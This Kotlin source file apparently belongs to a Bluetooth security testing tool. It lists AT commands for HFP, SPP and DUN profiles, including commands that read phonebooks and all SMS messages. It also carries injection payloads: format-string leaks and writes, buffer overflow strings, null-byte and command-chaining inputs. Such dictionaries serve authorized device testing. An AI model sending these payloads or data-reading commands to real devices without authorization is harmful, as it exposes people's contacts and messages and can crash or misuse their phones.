/*
 * Bluetooth Security Testing Tool
 * Copyright (c) 2026 Security Research Team
 *
 * Licensed under MIT with additional restrictions:
 * - This application may ONLY be used for AUTHORIZED security testing
 * - See LICENSE for full terms
 */
package com.btsec.testtool.domain.usecase

import com.btsec.testtool.domain.model.AtCommand
import com.btsec.testtool.domain.model.AtCommandCategory
import com.btsec.testtool.domain.model.SecurityRisk
import com.btsec.testtool.domain.model.SecurityRisk.*
import com.btsec.testtool.domain.model.AtCommandCategory.*
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Dictionary of AT commands organized by profile and category.
 *
 * Used for AUTHORIZED security testing of RFCOMM-based Bluetooth
 * profiles such as HFP, SPP, and DUN.
 */
@Singleton
class AtCommandDictionary @Inject constructor() {

    fun getCommandsForProfile(profile: String): List<AtCommand> {
        return when (profile.uppercase()) {
            "HFP", "HSP" -> HFP_COMMANDS
            "SPP" -> SPP_COMMANDS
            "DUN" -> DUN_COMMANDS
            else -> HFP_COMMANDS + SPP_COMMANDS + DUN_COMMANDS
        }
    }

    fun getAllCommands(): List<AtCommand> {
        return HFP_COMMANDS + SPP_COMMANDS + DUN_COMMANDS
    }

    fun getInjectionPayloads(): List<AtCommand> {
        return INJECTION_PAYLOADS
    }

    companion object {
        val HFP_COMMANDS = listOf(
            AtCommand("ATD", "Dial number", CALL_CONTROL, HIGH, "+1234567890;", "OK"),
            AtCommand("ATA", "Answer incoming call", CALL_CONTROL, HIGH, "", "OK"),
            AtCommand("ATH", "Hang up call", CALL_CONTROL, MEDIUM, "", "OK"),
            AtCommand("AT+CHUP", "Reject call (GSM)", CALL_CONTROL, MEDIUM, "", "OK"),
            AtCommand("AT+CLCC", "List current calls", CALL_CONTROL, MEDIUM, "", "+CLCC:"),
            AtCommand("AT+CLIP=1", "Enable caller ID", CALL_CONTROL, LOW, "", "OK"),
            AtCommand("AT+CMEE=1", "Enable extended errors", DEVICE_INFO, LOW, "", "OK"),
            AtCommand("AT+CBC", "Battery level", DEVICE_INFO, INFO, "", "+CBC:"),
            AtCommand("AT+CSQ", "Signal quality", NETWORK, INFO, "", "+CSQ:"),
            AtCommand("AT+COPS?", "Current operator", NETWORK, INFO, "", "+COPS:"),
            AtCommand("AT+CREG?", "Network registration", NETWORK, INFO, "", "+CREG:"),
            AtCommand("ATI", "Device identification", DEVICE_INFO, INFO, "", ""),
            AtCommand("AT+GMI", "Manufacturer", DEVICE_INFO, INFO, "", ""),
            AtCommand("AT+GMM", "Model", DEVICE_INFO, INFO, "", ""),
            AtCommand("AT+CGMI", "Manufacturer (GSM)", DEVICE_INFO, INFO, "", ""),
            AtCommand("AT+CGMM", "Model (GSM)", DEVICE_INFO, INFO, "", ""),
            AtCommand("AT+CPBS?", "Phonebook storage", PHONEBOOK, HIGH, "", "+CPBS:"),
            AtCommand("AT+CPBR=1", "Read phonebook entry 1", PHONEBOOK, CRITICAL, "", "+CPBR:"),
            AtCommand("AT+CPBF=\"\"", "Find phonebook entry", PHONEBOOK, CRITICAL, "", "+CPBF:"),
            AtCommand("AT+CMGF=1", "Set SMS text mode", SMS, HIGH, "", "OK"),
            AtCommand("AT+CMGL=\"ALL\"", "List all SMS", SMS, CRITICAL, "", "+CMGL:"),
            AtCommand("AT+CMGR=1", "Read SMS message 1", SMS, CRITICAL, "", "+CMGR:"),
        )

        val SPP_COMMANDS = listOf(
            AtCommand("AT", "Basic attention", DEVICE_INFO, INFO, "", "OK"),
            AtCommand("ATZ", "Reset to defaults", DEVICE_INFO, LOW, "", "OK"),
            AtCommand("ATE0", "Echo off", DEVICE_INFO, INFO, "", "OK"),
            AtCommand("ATE1", "Echo on", DEVICE_INFO, INFO, "", "OK"),
            AtCommand("AT+BTVER?", "Bluetooth version", BLUETOOTH, INFO, "", "+BTVER:"),
        )

        val DUN_COMMANDS = listOf(
            AtCommand("ATDT", "Dial tone number", CALL_CONTROL, HIGH, "1234567", "CONNECT"),
            AtCommand("ATDP", "Dial pulse number", CALL_CONTROL, HIGH, "1234567", "CONNECT"),
            AtCommand("ATH1", "Go off-hook", CALL_CONTROL, MEDIUM, "", "OK"),
            AtCommand("AT+CGDCONT?", "PDP context", NETWORK, MEDIUM, "", "+CGDCONT:"),
            AtCommand("AT+CGDATA?", "PDP data", NETWORK, MEDIUM, "", "CONNECT"),
        )

        val INJECTION_PAYLOADS = listOf(
            // Format strings
            AtCommand("AT%s%s%s%s", "Format string stack leak", INJECTION, CRITICAL),
            AtCommand("AT%x.%x.%x.%x", "Hex stack dump", INJECTION, CRITICAL),
            AtCommand("AT%n", "Format string write", INJECTION, CRITICAL),
            AtCommand("AT%08x.%08x.%08x", "Detailed hex leak", INJECTION, HIGH),
            AtCommand("AT%0.10000d", "Width denial of service", INJECTION, HIGH),
            // Buffer overflow
            AtCommand("AT" + "A".repeat(4096), "Buffer overflow (4K)", INJECTION, CRITICAL),
            AtCommand("AT" + "A".repeat(65536), "Buffer overflow (64K)", INJECTION, CRITICAL),
            AtCommand("ATD" + "0".repeat(256) + ";", "Phone number overflow", INJECTION, HIGH),
            // Null bytes
            AtCommand("AT\u0000D0000000;", "Null byte injection", INJECTION, HIGH),
            // Command injection
            AtCommand("ATD;+CMGF=1;+CMGS=\"000\"", "Command chaining", INJECTION, HIGH),
            AtCommand("AT+CPBW=1,\"000\",,\"AAAA\"", "Phonebook write attempt", INJECTION, HIGH),
        )
    }
}
